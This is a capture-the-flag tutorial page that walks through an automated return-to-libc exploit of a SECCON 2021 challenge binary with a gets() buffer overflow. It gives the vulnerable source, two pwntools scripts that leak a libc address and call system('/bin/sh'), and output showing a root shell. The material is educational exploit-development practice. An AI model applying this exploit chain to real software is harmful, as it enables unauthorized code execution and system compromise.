---
title: Return To Libc - Automated by Pwntools
date: 0005-01-01T00:00:06Z
draft: false
description: Pwn for Fun and Profit is a progressive tutorial series that aims to be noob-friendly enough for anyone to dive in, and equip them with the skills to come out with substantial knowledge on The Art of Pwn.
toc: false
---

This is a continuation of [Return 2 LIBC Part 1](/pwn/rop/ret2libc1). If you have not read it, please read it before continuing.

<br>

## Recap

In the last part of `Ret2Libc`, we exploited this simple program _(albeit painfully)_ from SECCON 2021;

```c
// gcc src.c -no-pie -fno-stack-protector -o chall -Wall -Wextra
#include <stdio.h>

int main() {
  char str[0x100];
  gets(str);
  puts(str);

}
```

This time, we will do it without finding any addresses from all over the place.

<br>

## Exploit

First, we need to know the `LIBC` that we are running _(or if you are connecting to a remote-service, you have to know their `LIBC`, or leak it)_


```
➜ ldd ./chall
 linux-vdso.so.1 (0x00007fff1b598000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fec9057f000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fec90763000)
```

Our Libc is at `/lib/x86_64-linux-gnu/libc.so.6`.

Now let's write our script to firstly leak our `gets()` address.

This time, we will use our `PwnTools` module to set the `context`, our `binary` and our `libc`.

Using PwnTools `ROP` module, we can call symbols and easily craft our `ROP chain`.

We can also easily find our addresses with `elf.got.gets`.

```py
from pwn import *

context.binary = elf = ELF('chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process('chall')

rop = ROP(elf)
rop.puts(elf.got.gets)
rop.main()

p.sendline(flat({ 264: rop.chain() }))
p.interactive()
```

![image](/pwn/images/ret2libc3.png)

As you can see we successfully managed to get our leaks and loop back to main().

<br>

#### Final Exploit Script

Let's finish up the rest of our script.

```py
from pwn import *

p = process('./chall')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = elf = ELF('chall')

rop = ROP(elf)
rop.puts(elf.got.gets)
rop.main()

p.sendline(flat({ 264: rop.chain() }))
p.recvuntil(cyclic(264))
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
leak2 = u64(p.recvline().strip().ljust(8,b'\x00'))

log.info(f"leak1: {hex(leak)}, leak2: {hex(leak2)}")

libc.address = leak2 - libc.sym.gets
binsh = next(libc.search(b"/bin/sh"))

rop = ROP([libc, elf])
rop.system(binsh)

p.sendline(flat({ 264: rop.chain() }))
p.interactive()
```

Output:

```
[x] Starting local process './chall'
[+] Starting local process './chall': pid 11788
[*] leak1: 0x4011f3, leak2: 0x7f3dd7de2b60
[*] Switching to interactive mode

$ id
uid=0(root) gid=0(root) groups=0(root)

$ whoami
root
```

Voila!  We have pwned it without needing to find a single address manually.


